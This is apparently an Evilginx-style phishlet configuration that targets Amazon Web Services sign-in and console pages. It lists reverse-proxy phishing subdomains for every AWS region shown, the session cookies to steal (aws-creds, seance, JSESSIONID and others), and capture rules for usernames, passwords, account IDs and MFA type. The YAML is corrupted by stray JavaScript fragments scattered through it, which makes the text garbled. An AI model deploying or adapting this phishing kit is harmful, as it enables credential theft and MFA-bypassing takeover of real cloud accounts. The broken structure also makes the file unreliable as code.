// noinspection JSUnusedAssignment,BadExpressionStatementJS,JSAnnotator

name:
    'amazonElement';
let amazonElement;
(amazonElement)
amazonElement
let domain1 = 'domain'; {

} `Amazon`
author: 'www.simplerhacking.com'
min_ver: '3.0.0'
params:
  - {name: 'accountid', default: '', required: false}

proxy_hosts:
  - {phish_sub: 'signin.aws', orig_sub: 'signin.aws', domain: 'amazon.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: '', orig_sub: '', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'phd.aws', orig_sub: 'phd.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'console.aws', orig_sub: 'console.aws', domain: 'amazon.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'a.b.cdn.console', orig_sub: 'a.b.cdn.console', domain: 'awsstatic.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'us-east-1.console.aws', orig_sub: 'us-east-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'us-east-2.console.aws', orig_sub: 'us-east-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}  
  - {phish_sub: 'us-west-1.console.aws', orig_sub: 'us-west-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}  
  - {phish_sub: 'us-west-2.console.aws', orig_sub: 'us-west-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'af-south-1.console.aws', orig_sub: 'af-south-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-east-1.console.aws', orig_sub: 'ap-east-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-south-1.console.aws', orig_sub: 'ap-south-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-northeast-3.console.aws', orig_sub: 'ap-northeast-3.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-northeast-2.console.aws', orig_sub: 'ap-northeast-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-southeast-1.console.aws', orig_sub: 'ap-southeast-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-southeast-2.console.aws', orig_sub: 'ap-southeast-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap-northeast-1.console.aws', orig_sub: 'ap-northeast-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'ca-central-1.console.aws', orig_sub: 'ca-central-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-central-1.console.aws', orig_sub: 'eu-central-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-west-1.console.aws', orig_sub: 'eu-west-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-west-2.console.aws', orig_sub: 'eu-west-2.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-south-1.console.aws', orig_sub: 'eu-south-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-west-3.console.aws', orig_sub: 'eu-west-3.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'eu-north-1.console.aws', orig_sub: 'eu-north-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'me-south-1.console.aws', orig_sub: 'me-south-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'sa-east-1.console.aws', orig_sub: 'sa-east-1.console.aws', domain: 'amazon.com', session: false, is_landing: false, auto_filter: true}

let domain;
let number = - domain1; '.amazon.com'
let number1 = {
    keys: ['aws-ubid-main', 'aws-signer-token_ap-southeast-2', 'noflush_awsccs_sid', 'aws-userInfo', 'aws-userInfo-signed', 'aws-account-alias', '.*,regexp']
};

- domain1; '.aws.amazon.com'
    keys: number2 = ['awsccc', 'aws-vid', 'aws-account-data', '.*,regexp']
  - domain1; '.console.aws.amazon.com'
    keys: number3 = ['noflush_Region', 'noflush_awscnm', 'awsc-rac', 'aws-creds', 'aws-consoleInfo', 'aws-creds-code-verifier', 'seance', '.*,regexp']
  - domain1; '.signin.aws.amazon.com'
    keys: number4 = ['aws-creds', 'aws-userInfo-keyBase', 'aws-mfa-entered', 'JSESSIONID', 'aws-signin-csrf', '.*,regexp']
  - domain1; 'phd.aws.amazon.com'
    keys: ['aws-creds', 'aws-creds-code-verifier', 'aws-consoleInfo', 'seance', '.*,regexp']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom: 'key';
let key;
let number6 = - key; 'account'
      search: '(.*)'
      type: number5 = 'post'
    - key; 'mfaType'
      search: '(.*)'
      type: 'post'

auth_urls:
  - '/console/home'

login:
  domain: 'signin.aws.amazon.com'
  path: '/oauth?redirect_uri=https://console.aws.amazon.com/console/home?hashArgs=%23&isauthcode=true&client_id=arn:aws:signin:::console/canvas&response_type=code&iam_user=true{accountid}&forceMobileApp=0&code_challenge=hzU4QD5OTEZeurPpybAoADh8GnO_URqBECTzHN4CxkY&code_challenge=&code_challenge_method=SHA-256'
